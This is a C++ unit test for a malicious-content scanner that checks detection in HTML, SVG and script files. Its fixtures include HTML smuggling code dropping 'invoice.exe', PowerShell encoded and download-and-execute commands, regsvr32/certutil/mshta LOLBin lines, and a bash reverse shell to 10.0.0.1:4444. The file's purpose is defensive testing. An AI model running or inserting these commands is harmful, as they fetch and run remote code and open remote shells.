#include "../text_scan.h"

#include <cassert>
#include <cstdio>
#include <string>
#include <vector>

namespace {

using Bytes = std::vector<uint8_t>;

Bytes B(const std::string& s) { return Bytes(s.begin(), s.end()); }

std::string Base64Blob(size_t n) {
    static const char* kAlpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string s;
    uint32_t x = 12345;
    for (size_t i = 0; i < n; i++) {
        x = x * 1103515245u + 12345u;
        s += kAlpha[(x >> 16) & 63];
    }
    return s;
}

noxos::CheapFilterResult Scan(const std::string& text, const std::string& type, std::string* json = nullptr) {
    std::string j;
    auto r = noxos::ScanText(B(text), type, j);
    if (json) *json = j;
    return r;
}

bool Has(const noxos::CheapFilterResult& r, const char* needle) {
    if (!r.flagged || r.reason.find(needle) == std::string::npos) {
        fprintf(stderr, "expected \"%s\", got flagged=%d \"%s\"\n", needle, r.flagged, r.reason.c_str());
        return false;
    }
    return true;
}

}  // namespace

int main() {
    assert(noxos::LooksLikeSvg(B("<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>")));
    assert(noxos::LooksLikeSvg(B("\xEF\xBB\xBF  \n<?xml version=\"1.0\"?>\n<!-- c -->\n<svg width=\"1\"/>")));
    assert(!noxos::LooksLikeSvg(B("<html><body><svg></svg></body></html>")));
    assert(!noxos::LooksLikeSvg(B("plain text <svg")));
    assert(noxos::LooksLikeHtml(B("<!DOCTYPE html><html></html>")));
    assert(noxos::LooksLikeHtml(B("  <HTML><HEAD></HEAD></HTML>")));
    assert(noxos::LooksLikeHtml(B("<script>alert(1)</script>")));
    assert(!noxos::LooksLikeHtml(B("just words <html> later")));
    assert(!noxos::LooksLikeHtml(B("")));
    assert(noxos::IsScriptExtension("ps1") && noxos::IsScriptExtension("hta") && !noxos::IsScriptExtension("txt"));

    {
        std::string j;
        auto r = Scan("<!DOCTYPE html><html><body><p>Hello</p></body></html>", "html", &j);
        assert(!r.flagged);
        assert(j.find("\"file_type\":\"html\"") != std::string::npos);
        assert(j.find("\"text_script_tags\":0") != std::string::npos);
    }
    {
        std::string smuggle = "<html><script>var d=atob(\"" + Base64Blob(3000) +
                              "\");var b=new Blob([d],{type:'application/octet-stream'});"
                              "var a=document.createElement('a');a.href=URL.createObjectURL(b);"
                              "a.download='invoice.exe';a.click();</script></html>";
        std::string j;
        assert(Has(Scan(smuggle, "html", &j), "HTML smuggling"));
        assert(j.find("\"text_blob_api\":true") != std::string::npos);
        assert(j.find("\"text_atob\":true") != std::string::npos);
        std::string csv = "<html><script>var b=new Blob([rows.join('\\n')],{type:'text/csv'});"
                          "var a=document.createElement('a');a.href=URL.createObjectURL(b);"
                          "a.download='export.csv';a.click();</script></html>";
        assert(!Scan(csv, "html").flagged);
        std::string img = "<html><body><img src=\"data:image/png;base64," + Base64Blob(5000) + "\"></body></html>";
        assert(!Scan(img, "html").flagged);
        std::string atob_small = "<html><script>var s=atob('aGVsbG8=');</script></html>";
        assert(!Scan(atob_small, "html").flagged);
    }
    {
        assert(!Scan("<svg xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M0 0\"/></svg>", "svg").flagged);
        assert(Has(Scan("<svg><script>alert(1)</script></svg>", "svg"), "<script> element"));
        assert(Has(Scan("<svg onload=\"alert(1)\"></svg>", "svg"), "event-handler"));
        assert(Has(Scan("<svg><a xlink:href=\"javascript:evil()\"><text>x</text></a></svg>", "svg"), "javascript: URL"));
        assert(Has(Scan("<svg><foreignObject><iframe src=\"x\"/></foreignObject></svg>", "svg"), "foreignObject"));
        assert(!Scan("<html><body onclick=\"go()\"><script>f()</script></body></html>", "html").flagged);
    }
    {
        assert(Has(Scan("<script>eval(atob('YWxlcnQoMSk='))</script>", "html"), "eval of decoded data"));
        assert(Has(Scan("eval(unescape('%61%6c'))", "script"), "eval of decoded data"));
        assert(Has(Scan("powershell.exe -NoP -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAA==", "script"), "PowerShell encoded command"));
        assert(Has(Scan("powershell -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAA==", "script"), "PowerShell encoded command"));
        assert(Has(Scan("iex ((New-Object Net.WebClient).DownloadString('http://x/a.ps1'))", "script"),
                   "download-and-execute"));
        assert(Has(Scan("$b=[Convert]::FromBase64String($s); Invoke-Expression ([Text.Encoding]::UTF8.GetString($b))\n"
                        "powershell", "script"), "download-and-execute or base64-execute"));
        assert(Has(Scan("powershell -WindowStyle Hidden -c \"(New-Object Net.WebClient).DownloadFile('http://x','a.exe')\"",
                        "script"), "PowerShell"));
        assert(!Scan("Write-Host 'hello'\nGet-ChildItem | Sort-Object Length\n", "script").flagged);
        assert(!Scan("powershell -Command Get-Process", "script").flagged);
        assert(Has(Scan("Set sh = CreateObject(\"WScript.Shell\")\nsh.Run \"cmd /c calc\"\n", "script"), "WScript.Shell"));
        assert(Has(Scan("var s=new ActiveXObject('Shell.Application'); s.ShellExecute('cmd.exe');", "script"),
                   "WScript.Shell/Shell.Application"));
        assert(Has(Scan("regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", "script"), "living-off-the-land"));
        assert(Has(Scan("certutil -urlcache -f http://x/a.exe a.exe", "script"), "living-off-the-land"));
        assert(Has(Scan("echo $P | base64 -d | bash\n", "script"), "base64 and pipes it to a shell"));
        assert(Has(Scan("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", "script"), "reverse shell"));
        std::string j;
        assert(!Scan("#!/bin/sh\ncurl -fsSL https://example.com/install.sh | sh\n", "script", &j).flagged);
        assert(j.find("\"text_pipe_to_shell\":1") != std::string::npos);
        assert(!Scan("#!/bin/sh\necho hello\nls -l\n", "script").flagged);
        assert(Has(Scan("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", "script"), "EICAR"));
    }
    {
        assert(!Scan("<html><body><pre>Set o = wscript.createobject(\"wscript.shell\")\no.Run \"x\"\n"
                     "regsvr32 /s /n /u /i:http://x scrobj.dll\npowershell -e is a flag\n"
                     "bash -i >& /dev/tcp/host/port 0>&1</pre></body></html>", "html").flagged);
        assert(Has(Scan("<html><script>var s=new ActiveXObject('WScript.Shell');s.Run('calc');</script></html>", "html"),
                   "WScript.Shell"));
        std::string far = "var a=new Blob([x]);" + std::string(10000, ' ') + "a.download='x';a.click();" +
                          std::string(10000, ' ') + "var d='" + Base64Blob(6000) + "';";
        assert(!Scan("<html><script>" + far + "</script></html>", "html").flagged);
        assert(!Scan(far, "script").flagged);
        std::string near = "var d=atob('" + Base64Blob(3000) + "');var a=new Blob([d]);a.download='x';a.click();";
        assert(Has(Scan(near, "script"), "HTML smuggling"));
        std::string mshta = "key=" + Base64Blob(300) + "mshta" + Base64Blob(300) + " http://example.com";
        assert(!Scan(mshta, "script").flagged);
        assert(Has(Scan("mshta http://evil.example/a.hta", "script"), "living-off-the-land"));
        assert(!Scan("powershell -e foo\npowershell -enc short\n", "script").flagged);
        assert(Has(Scan("powershell -enc " + Base64Blob(60), "script"), "PowerShell encoded command"));
        assert(Has(Scan("cmd /c \"-EncodedCommand " + Base64Blob(60) + "\"", "script"), "PowerShell encoded command"));
        assert(!Scan("$wc = New-Object net.webclient\n$wc.Downloadfile($url, $out)\n"
                     "Start-Process msiexec.exe -ArgumentList $a -Wait\n", "script").flagged);
        assert(Has(Scan("iwr http://x/a.ps1 -UseBasicParsing | iex", "script"), "download-and-execute"));
        assert(!Scan("bash -i >& /dev/tcp/host/22", "html").flagged);
    }
    {
        std::string big(9 * 1024 * 1024, 'a');
        std::string j;
        Scan(big, "html", &j);
        assert(j.find("\"text_truncated\":true") != std::string::npos);
        assert(!Scan("", "script").flagged);
    }

    printf("ok: text_scan_test passed\n");
    return 0;
}
